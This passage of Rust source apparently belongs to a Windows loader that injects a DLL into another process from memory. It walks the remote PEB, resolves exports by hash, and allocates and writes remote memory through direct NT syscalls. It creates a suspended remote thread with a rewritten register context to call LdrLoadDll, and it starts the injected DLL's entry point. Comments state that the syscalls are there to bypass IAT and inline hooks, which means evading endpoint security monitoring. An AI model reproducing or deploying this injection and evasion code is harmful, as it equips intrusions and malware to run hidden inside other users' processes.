    let local_ntdll =
        pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"ntdll.dll\0"))
            .ok_or_else(|| anyhow!("build_remote_module_map: ntdll not found via PEB walk"))?;
    let ntqip_addr = pe_resolve::get_proc_address_by_hash(
        local_ntdll,
        pe_resolve::hash_str(b"NtQueryInformationProcess\0"),
    )
    .ok_or_else(|| anyhow!("build_remote_module_map: NtQueryInformationProcess not found"))?;
    let ntqip: NtQueryInformationProcessFn = std::mem::transmute(ntqip_addr as *const ());

    // Step 1: query the remote PEB address via NtQueryInformationProcess.
    let mut pbi: ProcessBasicInformation = std::mem::zeroed();
    let mut return_len = 0u32;
    let status = ntqip(
        target_process,
        0, // ProcessBasicInformation
        &mut pbi as *mut _ as *mut c_void,
        std::mem::size_of::<ProcessBasicInformation>() as u32,
        &mut return_len,
    );
    if status < 0 || pbi.peb_base_address.is_null() {
        return Err(anyhow!(
            "build_remote_module_map: NtQueryInformationProcess failed (status={status:#x})"
        ));
    }

    // Step 2: read PEB.Ldr to get the loader data structure.
    let peb: PEB = read_remote_struct(target_process, pbi.peb_base_address as *const c_void)
        .ok_or_else(|| anyhow!("build_remote_module_map: failed to read remote PEB"))?;
    if peb.Ldr.is_null() {
        return Err(anyhow!("build_remote_module_map: remote PEB.Ldr is null"));
    }

    // Step 3: walk InLoadOrderModuleList starting at PEB.Ldr + 0x10.
    // The list_head lives at offset 0x10 (InLoadOrderModuleList) inside
    // PEB_LDR_DATA.  Each entry is an LDR_DATA_TABLE_ENTRY whose first field
    // (InLoadOrderLinks) is the LIST_ENTRY that chains the list together.
    let ldr: PEB_LDR_DATA = read_remote_struct(target_process, peb.Ldr as *const c_void)
        .ok_or_else(|| anyhow!("build_remote_module_map: failed to read remote PEB_LDR_DATA"))?;
    let list_head = (peb.Ldr as usize + 0x10) as *mut LIST_ENTRY; // InLoadOrderModuleList offset
    let mut current = ldr.InLoadOrderModuleList.Flink;
    let mut guard = 0usize;
    let mut map = HashMap::new();

    while !current.is_null() && current != list_head && guard < 4096 {
        guard += 1;

        let entry: LDR_DATA_TABLE_ENTRY =
            match read_remote_struct(target_process, current as *const c_void) {
                Some(e) => e,
                None => break,
            };

        let dll_base = entry.DllBase as usize;
        let base_name = entry.BaseDllName;
        if dll_base != 0
            && !base_name.Buffer.is_null()
            && base_name.Length >= 2
            && (base_name.Length as usize) <= 520
        {
            let chars = (base_name.Length / 2) as usize;
            let mut wide = vec![0u16; chars];
            let mut bytes_read = 0usize;
            let read_status = nt_syscall::syscall!(
                "NtReadVirtualMemory",
                target_process as u64,
                base_name.Buffer as u64,
                wide.as_mut_ptr() as u64,
                base_name.Length as u64,
                &mut bytes_read as *mut _ as u64,
            );
            if read_status.map_or(false, |s| s >= 0) && bytes_read == base_name.Length as usize {
                let name = String::from_utf16_lossy(&wide).to_ascii_lowercase();
                map.insert(name, dll_base);
            }
        }

        current = entry.InLoadOrderLinks.Flink;
    }

    Ok(map)
}

/// Resolve the address of an exported function in a DLL that is loaded at
/// `remote_dll_base` inside `target_process`.
///
/// Reads the PE export table from the remote process address space via
/// `ReadProcessMemory` so that the returned address is correct even when the
/// remote process has a different ASLR layout from the current process.
///
/// Only PE32+ (64-bit) DLLs are supported; returns `Err` for PE32 images.
///
/// # Returns
///
/// The absolute virtual address of `fn_name` in the *remote* process on
/// success.
///
/// # Errors
///
/// Returns `Err` if:
/// - the PE headers cannot be read or are malformed,
/// - the DLL has no export directory,
/// - `fn_name` is not found in the export table.
unsafe fn resolve_remote_export(
    target_process: windows_sys::Win32::Foundation::HANDLE,
    remote_dll_base: usize,
    fn_name: &str,
) -> Result<usize> {
    // Helper: read exactly `n` bytes from the remote process at `addr`.
    let read_bytes = |addr: usize, n: usize| -> Result<Vec<u8>> {
        let mut buf = vec![0u8; n];
        let mut bytes_read = 0usize;
        let status = nt_syscall::syscall!(
            "NtReadVirtualMemory",
            target_process as u64,
            addr as u64,
            buf.as_mut_ptr() as u64,
            n as u64,
            &mut bytes_read as *mut _ as u64,
        );
        if status.as_ref().map_or(true, |s| *s < 0) || bytes_read != n {
            return Err(anyhow!(
                "resolve_remote_export: NtReadVirtualMemory at {addr:#x} len={n} failed: status={:?}",
                status
            ));
        }
        Ok(buf)
    };

    // ── Parse IMAGE_DOS_HEADER (64 bytes) ─────────────────────────────────
    let dos = read_bytes(remote_dll_base, 64)?;
    let e_magic = u16::from_le_bytes(dos[0..2].try_into().unwrap());
    if e_magic != 0x5A4D {
        // "MZ"
        return Err(anyhow!(
            "resolve_remote_export: bad DOS magic at {remote_dll_base:#x}: {e_magic:#x}"
        ));
    }
    let e_lfanew = u32::from_le_bytes(dos[0x3C..0x40].try_into().unwrap()) as usize;

    // ── Parse IMAGE_NT_HEADERS ────────────────────────────────────────────
    //
    // Byte layout from the NT headers base address:
    //   +0   Signature                  (4 bytes)  = "PE\0\0" = 0x00004550
    //   +4   IMAGE_FILE_HEADER          (20 bytes)
    //   +24  IMAGE_OPTIONAL_HEADER (PE32+ or PE32):
    //          PE32+ (magic 0x020B):
    //            [0..112)  pre-DataDirectory fields
    //            [112..116) DataDirectory[0].VirtualAddress  ← export RVA
    //            [116..120) DataDirectory[0].Size             ← export size
    //            Total needed: 4 + 20 + 112 + 8 = 144 bytes.
    //          PE32  (magic 0x010B):
    //            [0..96)    pre-DataDirectory fields
    //            [96..100)  DataDirectory[0].VirtualAddress   ← export RVA
    //            [100..104) DataDirectory[0].Size              ← export size
    //            Total needed: 4 + 20 + 96 + 8 = 128 bytes.
    //
    // Read 144 bytes (PE32+ size) which covers both formats, then dispatch
    // on the optional-header magic.
    let nt = read_bytes(remote_dll_base + e_lfanew, 144)?;
    if u32::from_le_bytes(nt[0..4].try_into().unwrap()) != 0x0000_4550 {
        return Err(anyhow!(
            "resolve_remote_export: bad PE signature at {remote_dll_base:#x}"
        ));
    }
    // Optional-header magic: 0x020B = PE32+ (64-bit), 0x010B = PE32 (32-bit).
    let opt_magic = u16::from_le_bytes(nt[24..26].try_into().unwrap());
    let (export_rva, export_size) = match opt_magic {
        0x020B => {
            // PE32+: DataDirectory[0] at offset 112 from optional header start
            let rva = u32::from_le_bytes(nt[136..140].try_into().unwrap()) as usize;
            let size = u32::from_le_bytes(nt[140..144].try_into().unwrap()) as usize;
            (rva, size)
        }
        0x010B => {
            // PE32: DataDirectory[0] at offset 96 from optional header start
            let rva = u32::from_le_bytes(nt[120..124].try_into().unwrap()) as usize;
            let size = u32::from_le_bytes(nt[124..128].try_into().unwrap()) as usize;
            (rva, size)
        }
        _ => {
            return Err(anyhow!(
                "resolve_remote_export: unsupported optional-header magic {opt_magic:#x} \
                 at {remote_dll_base:#x} (expected PE32+ 0x020B or PE32 0x010B)"
            ));
        }
    };
    if export_rva == 0 || export_size < 40 {
        return Err(anyhow!(
            "resolve_remote_export: DLL at {remote_dll_base:#x} has no export directory"
        ));
    }

    // ── Read and walk the export directory ───────────────────────────────
    // IMAGE_EXPORT_DIRECTORY field offsets (all DWORDs unless noted):
    //   +20  NumberOfFunctions
    //   +24  NumberOfNames
    //   +28  AddressOfFunctions     RVA → DWORD[] of function RVAs
    //   +32  AddressOfNames         RVA → DWORD[] of name RVAs
    //   +36  AddressOfNameOrdinals  RVA → WORD[]  of hint ordinals
    let exp = read_bytes(remote_dll_base + export_rva, export_size)?;
    let num_names = u32::from_le_bytes(exp[24..28].try_into().unwrap()) as usize;
    let fn_table_rva = u32::from_le_bytes(exp[28..32].try_into().unwrap()) as usize;
    let name_table_rva = u32::from_le_bytes(exp[32..36].try_into().unwrap()) as usize;
    let ordinal_table_rva = u32::from_le_bytes(exp[36..40].try_into().unwrap()) as usize;

    if num_names == 0 {
        return Err(anyhow!(
            "resolve_remote_export: DLL at {remote_dll_base:#x} has no named exports"
        ));
    }

    // Read name-pointer and ordinal tables in bulk to minimise round-trips.
    let name_ptrs = read_bytes(remote_dll_base + name_table_rva, num_names * 4)?;
    let ordinals = read_bytes(remote_dll_base + ordinal_table_rva, num_names * 2)?;

    for i in 0..num_names {
        let name_rva = u32::from_le_bytes(name_ptrs[i * 4..i * 4 + 4].try_into().unwrap()) as usize;
        // Read the null-terminated export name (cap at 256 bytes to bound I/O).
        let name_raw =
            read_bytes(remote_dll_base + name_rva, 256).unwrap_or_else(|_| vec![0u8; 256]);
        let nul = name_raw.iter().position(|&b| b == 0).unwrap_or(256);
        let name = std::str::from_utf8(&name_raw[..nul]).unwrap_or("");
        if name == fn_name {
            let ordinal =
                u16::from_le_bytes(ordinals[i * 2..i * 2 + 2].try_into().unwrap()) as usize;
            let fn_rva_bytes = read_bytes(remote_dll_base + fn_table_rva + ordinal * 4, 4)?;
            let fn_rva = u32::from_le_bytes(fn_rva_bytes.try_into().unwrap()) as usize;
            if fn_rva >= export_rva && fn_rva < export_rva + export_size {
                let forwarder = read_remote_c_string_from_image(
                    target_process,
                    remote_dll_base,
                    fn_rva,
                    export_rva + export_size,
                    256,
                    "resolve_remote_export forwarder",
                )?;
                return resolve_remote_forwarder_export(target_process, &forwarder);
            }
            return Ok(remote_dll_base + fn_rva);
        }
    }

    Err(anyhow!(
        "resolve_remote_export: '{}' not found in DLL at {remote_dll_base:#x}",
        fn_name
    ))
}

unsafe fn resolve_remote_export_by_ordinal(
    target_process: windows_sys::Win32::Foundation::HANDLE,
    remote_dll_base: usize,
    ordinal: u16,
) -> Result<usize> {
    let dos = read_remote_exact(
        target_process,
        remote_dll_base,
        64,
        "resolve_remote_export_by_ordinal",
    )?;
    if dos.len() < 64 {
        return Err(anyhow!(
            "resolve_remote_export_by_ordinal: short DOS header at {remote_dll_base:#x}"
        ));
    }
    let e_magic = u16::from_le_bytes(dos[0..2].try_into().unwrap());
    if e_magic != 0x5A4D {
        return Err(anyhow!(
            "resolve_remote_export_by_ordinal: bad DOS magic at {remote_dll_base:#x}: {e_magic:#x}"
        ));
    }
    let e_lfanew = i32::from_le_bytes(dos[60..64].try_into().unwrap());
    if e_lfanew < 0 {
        return Err(anyhow!(
            "resolve_remote_export_by_ordinal: negative e_lfanew at {remote_dll_base:#x}"
        ));
    }
    let e_lfanew = e_lfanew as usize;

    let nt = read_remote_exact(
        target_process,
        remote_dll_base + e_lfanew,
        144,
        "resolve_remote_export_by_ordinal",
    )?;
    if u32::from_le_bytes(nt[0..4].try_into().unwrap()) != 0x0000_4550 {
        return Err(anyhow!(
            "resolve_remote_export_by_ordinal: bad PE signature at {remote_dll_base:#x}"
        ));
    }
    let opt_magic = u16::from_le_bytes(nt[24..26].try_into().unwrap());
    if opt_magic != 0x020B {
        return Err(anyhow!(
            "resolve_remote_export_by_ordinal: unsupported optional-header magic {opt_magic:#x} at {remote_dll_base:#x}"
        ));
    }
    let export_rva = u32::from_le_bytes(nt[136..140].try_into().unwrap()) as usize;
    let export_size = u32::from_le_bytes(nt[140..144].try_into().unwrap()) as usize;
    if export_rva == 0 || export_size < 40 {
        return Err(anyhow!(
            "resolve_remote_export_by_ordinal: DLL at {remote_dll_base:#x} has no export directory"
        ));
    }

    let exp = read_remote_exact(
        target_process,
        remote_dll_base + export_rva,
        export_size,
        "resolve_remote_export_by_ordinal",
    )?;
    let ordinal_base = u32::from_le_bytes(exp[16..20].try_into().unwrap());
    let function_count = u32::from_le_bytes(exp[20..24].try_into().unwrap());
    let function_table_rva = u32::from_le_bytes(exp[28..32].try_into().unwrap()) as usize;

    let ordinal_u32 = ordinal as u32;
    if ordinal_u32 < ordinal_base {
        return Err(anyhow!(
            "resolve_remote_export_by_ordinal: ordinal {} is below export base {} at {remote_dll_base:#x}",
            ordinal,
            ordinal_base
        ));
    }
    let index = (ordinal_u32 - ordinal_base) as usize;
    if index >= function_count as usize {
        return Err(anyhow!(
            "resolve_remote_export_by_ordinal: ordinal {} index {} exceeds function count {} at {remote_dll_base:#x}",
            ordinal,
            index,
            function_count
        ));
    }

    let fn_rva_bytes = read_remote_exact(
        target_process,
        remote_dll_base + function_table_rva + index * 4,
        4,
        "resolve_remote_export_by_ordinal",
    )?;
    let fn_rva = u32::from_le_bytes(fn_rva_bytes.try_into().unwrap()) as usize;
    if fn_rva >= export_rva && fn_rva < export_rva + export_size {
        let forwarder = read_remote_c_string_from_image(
            target_process,
            remote_dll_base,
            fn_rva,
            export_rva + export_size,
            256,
            "resolve_remote_export_by_ordinal forwarder",
        )?;
        return resolve_remote_forwarder_export(target_process, &forwarder);
    }

    Ok(remote_dll_base + fn_rva)
}

unsafe fn resolve_remote_forwarder_export(
    target_process: windows_sys::Win32::Foundation::HANDLE,
    forwarder: &str,
) -> Result<usize> {
    thread_local! {
        static REMOTE_FORWARDER_DEPTH: std::cell::Cell<u32> = const { std::cell::Cell::new(0) };
    }

    let depth = REMOTE_FORWARDER_DEPTH.with(|cell| cell.get());
    if depth >= 8 {
        return Err(anyhow!(
            "resolve_remote_forwarder_export: forwarder chain too deep at {}",
            forwarder
        ));
    }

    struct ForwarderDepthGuard;
    impl Drop for ForwarderDepthGuard {
        fn drop(&mut self) {
            REMOTE_FORWARDER_DEPTH.with(|cell| cell.set(cell.get().saturating_sub(1)));
        }
    }

    REMOTE_FORWARDER_DEPTH.with(|cell| cell.set(depth + 1));
    let _guard = ForwarderDepthGuard;

    let (module_part, symbol_part) = forwarder.rsplit_once('.').ok_or_else(|| {
        anyhow!(
            "resolve_remote_forwarder_export: malformed forwarder string '{}'",
            forwarder
        )
    })?;
    let module_name = normalize_import_dll_name(module_part);
    let mut remote_modules = build_remote_module_map(target_process)?;
    let ldr_load_dll_addr = resolve_remote_ldr_load_dll(target_process, &remote_modules)?;
    let remote_module_base = ensure_remote_module_loaded_cached(
        target_process,
        &module_name,
        ldr_load_dll_addr,
        &mut remote_modules,
    )?;

    if let Some(ordinal_text) = symbol_part.strip_prefix('#') {
        let ordinal = ordinal_text.parse::<u16>().map_err(|e| {
            anyhow!(
                "resolve_remote_forwarder_export: invalid ordinal forwarder '{}': {}",
                forwarder,
                e
            )
        })?;
        resolve_remote_export_by_ordinal(target_process, remote_module_base, ordinal)
    } else {
        resolve_remote_export(target_process, remote_module_base, symbol_part)
    }
}

unsafe fn resolve_remote_ldr_load_dll(
    target_process: windows_sys::Win32::Foundation::HANDLE,
    remote_modules: &HashMap<String, usize>,
) -> Result<usize> {
    let remote_ntdll = remote_modules
        .get("ntdll.dll")
        .copied()
        .or_else(|| get_remote_ntdll_base(target_process))
        .ok_or_else(|| anyhow!("remote_manual_map: unable to locate remote ntdll.dll"))?;
    resolve_remote_export(target_process, remote_ntdll, "LdrLoadDll")
}

unsafe fn ensure_remote_module_loaded_cached(
    target_process: windows_sys::Win32::Foundation::HANDLE,
    dll_name: &str,
    ldr_load_dll_addr: usize,
    remote_modules: &mut HashMap<String, usize>,
) -> Result<usize> {
    let key = normalize_import_dll_name(dll_name);
    if let Some(&base) = remote_modules.get(&key) {
        return Ok(base);
    }

    let base = ensure_remote_module_loaded(target_process, &key, ldr_load_dll_addr)?;
    remote_modules.insert(key, base);
    Ok(base)
}

unsafe fn ensure_remote_module_loaded(
    target_process: windows_sys::Win32::Foundation::HANDLE,
    dll_name: &str,
    ldr_load_dll_addr: usize,
) -> Result<usize> {
    use windows_sys::Win32::System::Diagnostics::Debug::CONTEXT;
    #[cfg(target_arch = "x86_64")]
    use windows_sys::Win32::System::Diagnostics::Debug::CONTEXT_FULL_AMD64;
    #[cfg(target_arch = "aarch64")]
    use windows_sys::Win32::System::Diagnostics::Debug::CONTEXT_FULL_ARM64;

    let wide_name: Vec<u16> = dll_name.encode_utf16().chain(std::iter::once(0)).collect();
    let wide_bytes = wide_name.len() * 2;
    let us_offset = wide_bytes;
    let base_addr_offset = us_offset + std::mem::size_of::<UNICODE_STRING>();
    let total_remote = base_addr_offset + std::mem::size_of::<usize>();

    let mut remote_block: *mut c_void = std::ptr::null_mut();
    let mut remote_block_size = total_remote;
    let alloc_status = nt_syscall::syscall!(
        "NtAllocateVirtualMemory",
        target_process as u64,
        &mut remote_block as *mut _ as u64,
        0u64,
        &mut remote_block_size as *mut _ as u64,
        (MEM_COMMIT | MEM_RESERVE) as u64,
        PAGE_READWRITE as u64,
    )
    .unwrap_or(-1);
    if alloc_status < 0 || remote_block.is_null() {
        return Err(anyhow!(
            "remote_manual_map: failed to allocate remote LdrLoadDll staging block for {}",
            dll_name
        ));
    }

    let cleanup_block = |block: *mut c_void| {
        let mut free_base = block;
        let mut free_size: usize = 0;
        let _ = nt_syscall::syscall!(
            "NtFreeVirtualMemory",
            target_process as u64,
            &mut free_base as *mut _ as u64,
            &mut free_size as *mut _ as u64,
            MEM_RELEASE as u64,
        );
    };

    let mut written = 0usize;
    let write_name_status = nt_syscall::syscall!(
        "NtWriteVirtualMemory",
        target_process as u64,
        remote_block as u64,
        wide_name.as_ptr() as u64,
        wide_bytes as u64,
        &mut written as *mut _ as u64,
    )
    .unwrap_or(-1);
    if write_name_status < 0 || written != wide_bytes {
        cleanup_block(remote_block);
        return Err(anyhow!(
            "remote_manual_map: failed to write remote DLL name for LdrLoadDll ({})",
            dll_name
        ));
    }

    let remote_us_ptr = (remote_block as usize + us_offset) as *mut c_void;
    let remote_base_out = (remote_block as usize + base_addr_offset) as *mut c_void;
    let mut remote_us = UNICODE_STRING {
        Length: (wide_bytes.saturating_sub(2)) as u16,
        MaximumLength: wide_bytes as u16,
        Buffer: remote_block as *mut u16,
    };

    let write_us_status = nt_syscall::syscall!(
        "NtWriteVirtualMemory",
        target_process as u64,
        remote_us_ptr as u64,
        &mut remote_us as *mut _ as u64,
        std::mem::size_of::<UNICODE_STRING>() as u64,
        &mut written as *mut _ as u64,
    )
    .unwrap_or(-1);
    if write_us_status < 0 || written != std::mem::size_of::<UNICODE_STRING>() {
        cleanup_block(remote_block);
        return Err(anyhow!(
            "remote_manual_map: failed to write remote UNICODE_STRING for LdrLoadDll ({})",
            dll_name
        ));
    }

    let zero_base: usize = 0;
    let write_base_status = nt_syscall::syscall!(
        "NtWriteVirtualMemory",
        target_process as u64,
        remote_base_out as u64,
        &zero_base as *const _ as u64,
        std::mem::size_of::<usize>() as u64,
        &mut written as *mut _ as u64,
    )
    .unwrap_or(-1);
    if write_base_status < 0 || written != std::mem::size_of::<usize>() {
        cleanup_block(remote_block);
        return Err(anyhow!(
            "remote_manual_map: failed to initialize remote LdrLoadDll output slot for {}",
            dll_name
        ));
    }

    let mut h_thread: *mut c_void = std::ptr::null_mut();
    let create_status = nt_syscall::syscall!(
        "NtCreateThreadEx",
        &mut h_thread as *mut _ as u64,
        THREAD_INJECT_ACCESS,
        0u64,
        target_process as u64,
        ldr_load_dll_addr as u64,
        remote_us_ptr as u64,
        NT_THREAD_SUSPENDED,
        0u64,
        0u64,
        0u64,
        0u64,
    )
    .unwrap_or(-1);
    if create_status < 0 || h_thread.is_null() {
        cleanup_block(remote_block);
        return Err(anyhow!(
            "remote_manual_map: NtCreateThreadEx for remote LdrLoadDll({}) failed: {:#010x}",
            dll_name,
            create_status as u32
        ));
    }

    let mut args_configured = false;

    #[cfg(target_arch = "x86_64")]
    {
        let mut ctx: CONTEXT = std::mem::zeroed();
        ctx.ContextFlags = CONTEXT_FULL_AMD64;
        let get_ctx = nt_syscall::syscall!(
            "NtGetContextThread",
            h_thread as u64,
            &mut ctx as *mut _ as u64,
        )
        .unwrap_or(-1);
        if get_ctx >= 0 {
            ctx.Rcx = 0;
            ctx.Rdx = 0;
            ctx.R8 = remote_us_ptr as u64;
            ctx.R9 = remote_base_out as u64;
            let set_ctx = nt_syscall::syscall!(
                "NtSetContextThread",
                h_thread as u64,
                &ctx as *const _ as u64,
            )
            .unwrap_or(-1);
            args_configured = set_ctx >= 0;
        }
    }

    #[cfg(target_arch = "aarch64")]
    {
        let mut ctx: CONTEXT = std::mem::zeroed();
        ctx.ContextFlags = CONTEXT_FULL_ARM64;
        let get_ctx = nt_syscall::syscall!(
            "NtGetContextThread",
            h_thread as u64,
            &mut ctx as *mut _ as u64,
        )
        .unwrap_or(-1);
        if get_ctx >= 0 {
            let regs = &mut ctx.Anonymous.Anonymous;
            regs.X0 = 0;
            regs.X1 = 0;
            regs.X2 = remote_us_ptr as u64;
            regs.X3 = remote_base_out as u64;
            let set_ctx = nt_syscall::syscall!(
                "NtSetContextThread",
                h_thread as u64,
                &ctx as *const _ as u64,
            )
            .unwrap_or(-1);
            args_configured = set_ctx >= 0;
        }
    }

    if !args_configured {
        let _ = nt_syscall::syscall!("NtTerminateThread", h_thread as u64, 0u64);
        pe_resolve::close_handle(h_thread as *mut core::ffi::c_void);
        cleanup_block(remote_block);
        return Err(anyhow!(
            "remote_manual_map: failed to configure remote LdrLoadDll arguments for {}",
            dll_name
        ));
    }

    let _ = nt_syscall::syscall!("NtResumeThread", h_thread as u64, 0u64);
    // 30-second relative timeout (negative i64 in 100ns units) prevents
    // indefinite hang if the remote LdrLoadDll thread stalls.
    let wait_timeout: i64 = -30_000_000_0i64; // -30s in 100ns units
    let _ = nt_syscall::syscall!(
        "NtWaitForSingleObject",
        h_thread as u64,
        0u64,
        &wait_timeout as *const _ as u64,
    );

    let mut loaded_remote_base: usize = 0;
    let mut read = 0usize;
    let read_status = nt_syscall::syscall!(
        "NtReadVirtualMemory",
        target_process as u64,
        remote_base_out as u64,
        &mut loaded_remote_base as *mut _ as u64,
        std::mem::size_of::<usize>() as u64,
        &mut read as *mut _ as u64,
    )
    .unwrap_or(-1);

    pe_resolve::close_handle(h_thread as *mut core::ffi::c_void);
    cleanup_block(remote_block);

    if read_status < 0 || read != std::mem::size_of::<usize>() || loaded_remote_base == 0 {
        return Err(anyhow!(
            "remote_manual_map: remote LdrLoadDll did not return a module base for {}",
            dll_name
        ));
    }

    Ok(loaded_remote_base)
}

/// Map a PE DLL into a remote process without writing any file to disk.
///
/// # What this does
///
/// 1. **Allocates** a region in the target process large enough for the
///    complete mapped image via `NtAllocateVirtualMemory` (syscall-only path).
/// 2. **Copies** the PE headers and each raw section into the remote region
///    with `NtWriteVirtualMemory` (syscall-only path).
/// 3. **Applies base relocations** for the remote allocation address
///    (all arithmetic is done in local memory, then the patched words are
///    written into the remote image).
/// 4. **Resolves the Import Address Table** from local or remote module data.
///    Before import resolution, the loader verifies the shared-ASLR assumption
///    by comparing local and remote `ntdll.dll` bases via
///    `NtQueryInformationProcess` + `NtReadVirtualMemory`, then validating
///    critical DLL parity (`kernel32.dll`, `kernelbase.dll`) from a remote
///    PEB-walk module snapshot. If mismatches are detected, imports are resolved
///    from the remote process's actual module addresses (via
///    remote PEB walk + per-DLL PE export-table reads). If remote module
///    enumeration fails in the mismatch path, an error is returned rather than
///    proceeding with incorrect local addresses.
/// 5. **Starts the DLL entry point** via `NtCreateThreadEx` dispatched through
///    `nt_syscall::syscall!` (bypasses IAT and inline hooks).
///    Fire-and-forget: the returned thread handle is closed immediately after
///    creation.
///
/// # Arguments
///
/// * `target_process` — A `HANDLE` with at least `PROCESS_VM_OPERATION |
///   PROCESS_VM_WRITE | PROCESS_CREATE_THREAD` access rights.  The caller is
///   responsible for opening and closing the handle.
/// * `dll_bytes` — The raw PE DLL bytes to inject (in-memory, not a path).
///
/// # Exception handling (.pdata registration)
///
/// On x86-64, PE images contain a `.pdata` section with `RUNTIME_FUNCTION`
/// entries that the OS uses for exception unwinding.  The local loader
/// registers these via a direct `RtlAddFunctionTable` call.  In the remote
/// path, this function extends the DllMain shellcode stub to call
/// `RtlAddFunctionTable` (resolved from the target's ntdll via the same
/// fast/safe import-resolution path used for the IAT) **before** jumping to
/// DllMain.  This ensures C++ exceptions and SEH in the injected DLL work
/// correctly in the target process.
///
/// # Returns
///
/// The virtual address of the remote image base on success.
pub unsafe fn load_dll_in_remote_process(
    target_process: windows_sys::Win32::Foundation::HANDLE,
    dll_bytes: &[u8],
) -> Result<*mut c_void> {
    let pe = PE::parse(dll_bytes)?;
    let opt = pe
        .header
        .optional_header
        .ok_or_else(|| anyhow!("PE has no optional header"))?;

    let image_size = opt.windows_fields.size_of_image as usize;
    let preferred_base = opt.windows_fields.image_base as isize;

    // Validate that the PE machine type matches the host architecture.
    // The remote mapper reuses local addresses for import resolution
    // (shared-ASLR fast path) and emits shellcode tailored to the host's
    // instruction set, so a mismatch would silently corrupt the target.
    {
        let machine = pe.header.coff_header.machine;
        match machine {
            IMAGE_FILE_MACHINE_AMD64 | IMAGE_FILE_MACHINE_ARM64 => {
                #[cfg(not(any(target_arch = "x86_64", target_arch = "aarch64")))]
                {
                    return Err(anyhow!(
                        "load_dll_in_remote_process: PE is 64-bit (machine={:#06x}) but host process is 32-bit",
                        machine
                    ));
                }
            }
            IMAGE_FILE_MACHINE_I386 => {
                #[cfg(not(target_arch = "x86"))]
                {
                    return Err(anyhow!(
                        "load_dll_in_remote_process: PE is 32-bit (I386) but host process is 64-bit"
                    ));
                }
            }
            _ => {
                return Err(anyhow!(
                    "load_dll_in_remote_process: unsupported PE machine type {:#06x}",
                    machine
                ));
            }
        }
        #[cfg(target_arch = "x86_64")]
        if machine != IMAGE_FILE_MACHINE_AMD64 {
            return Err(anyhow!(
                "load_dll_in_remote_process: PE machine type {:#06x} does not match host architecture (expected AMD64)",
                machine
            ));
        }
        #[cfg(target_arch = "aarch64")]
        if machine != IMAGE_FILE_MACHINE_ARM64 {
            return Err(anyhow!(
                "load_dll_in_remote_process: PE machine type {:#06x} does not match host architecture (expected ARM64)",
                machine
            ));
        }
        #[cfg(target_arch = "x86")]
        if machine != IMAGE_FILE_MACHINE_I386 {
            return Err(anyhow!(
                "load_dll_in_remote_process: PE machine type {:#06x} does not match host architecture (expected I386)",
                machine
            ));
        }
    }

    // Verify the shared-ASLR assumption used by local import resolution.
    // When ntdll bases differ, all system-DLL addresses resolved in our
    // process will be wrong in the remote process. In that case we build
    // a remote module map via Toolhelp and resolve each IAT entry from the
    // actual remote module addresses. Failing to enumerate the remote
    // modules is a hard error: proceeding with local addresses would cause
    // silent import corruption in the target process.
    //
    // Even when ntdll matches, also verify critical Win32 DLLs (kernel32,
    // kernelbase). If either differs, switch to remote-module resolution.
    let local_ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"ntdll.dll\0"));
    let remote_ntdll = get_remote_ntdll_base(target_process);
    let remote_module_map: Option<HashMap<String, usize>> = if let (Some(local), Some(remote)) =
        (local_ntdll, remote_ntdll)
    {
        if local != remote {
            tracing::warn!(
                "remote_manual_map: NTDLL base mismatch (local={:#x}, remote={:#x}). \
                     Shared ASLR assumption does not hold — resolving imports from \
                     remote process module list.",
                local,
                remote
            );
            // Build the remote module map; fail immediately if enumeration
            // fails rather than proceeding with incorrect local addresses.
            Some(build_remote_module_map(target_process)?)
        } else {
            // ntdll matches: verify other critical DLL bases before taking
            // the shared-ASLR fast path.
            match build_remote_module_map(target_process) {
                Ok(rmod) => {
                    let local_kernel32 = pe_resolve::get_module_handle_by_hash(
                        pe_resolve::hash_str(b"kernel32.dll\0"),
                    );
                    let local_kernelbase = pe_resolve::get_module_handle_by_hash(
                        pe_resolve::hash_str(b"kernelbase.dll\0"),
                    );
                    let remote_kernel32 = rmod.get("kernel32.dll").copied();
                    let remote_kernelbase = rmod.get("kernelbase.dll").copied();

                    let kernel32_mismatch =
                        matches!((local_kernel32, remote_kernel32), (Some(l), Some(r)) if l != r);
                    let kernelbase_mismatch = matches!((local_kernelbase, remote_kernelbase), (Some(l), Some(r)) if l != r);

                    if kernel32_mismatch || kernelbase_mismatch {
                        tracing::warn!(
                                "remote_manual_map: shared-ASLR verification failed (kernel32 mismatch={}, kernelbase mismatch={}); resolving imports from remote process module list.",
                                kernel32_mismatch,
                                kernelbase_mismatch
                            );
                        Some(rmod)
                    } else {
                        None
                    }
                }
                Err(err) => {
                    // Preserve the fast path when the extra verification step
                    // cannot be performed and ntdll already matches.
                    tracing::warn!(
                            "remote_manual_map: unable to verify kernel32/kernelbase base parity ({}); keeping shared-ASLR fast path",
                            err
                        );
                    None
                }
            }
        }
    } else {
        None
    };

    // ── Step 1: allocate in the remote process ────────────────────────────
    // Use NtAllocateVirtualMemory to avoid IAT-visible VirtualAllocEx hooks.
    let _ = nt_syscall::init_syscall_infrastructure(); // idempotent

    let mut remote_base: *mut c_void = std::ptr::null_mut();
    let mut alloc_size = image_size;
    let alloc_status = nt_syscall::syscall!(
        "NtAllocateVirtualMemory",
        target_process as u64,
        &mut remote_base as *mut _ as u64,
        0u64,
        &mut alloc_size as *mut _ as u64,
        (MEM_COMMIT | MEM_RESERVE) as u64,
        PAGE_READWRITE as u64,
    );
    if alloc_status.as_ref().map_or(true, |s| *s < 0) || remote_base.is_null() {
        return Err(anyhow!(
            "NtAllocateVirtualMemory(remote) failed: status={:?}",
            alloc_status
        ));
    }

    // All remote memory writes and protection changes are dispatched through
    // nt_syscall::syscall! to avoid IAT-visible and inline-hookable Win32 wrappers.
    let protect_remote =
        |base: &mut *mut c_void, size: &mut usize, prot: u32, old: &mut u32| -> Result<()> {
            let status = nt_syscall::syscall!(
                "NtProtectVirtualMemory",
                target_process as u64,
                base as *mut _ as u64,
                size as *mut _ as u64,
                prot as u64,
                old as *mut _ as u64,
            );
            if status.as_ref().map_or(true, |s| *s < 0) {
                return Err(anyhow!(
                    "NtProtectVirtualMemory failed (status={:?})",
                    status
                ));
            }
            Ok(())
        };

    // Helper: write a local buffer slice into the remote process at an offset
    // from remote_base. Temporarily flips target pages to RW for the write and
    // restores their prior protection immediately afterward.
    let write_remote = |rva: usize, data: &[u8]| -> Result<()> {
        if data.is_empty() {
            return Ok(());
        }
        let dest = (remote_base as usize + rva) as *mut c_void;

        let mut prot_base = dest;
        let mut prot_size = data.len();
        let mut old_prot = 0u32;
        protect_remote(
            &mut prot_base,
            &mut prot_size,
            PAGE_READWRITE,
            &mut old_prot,
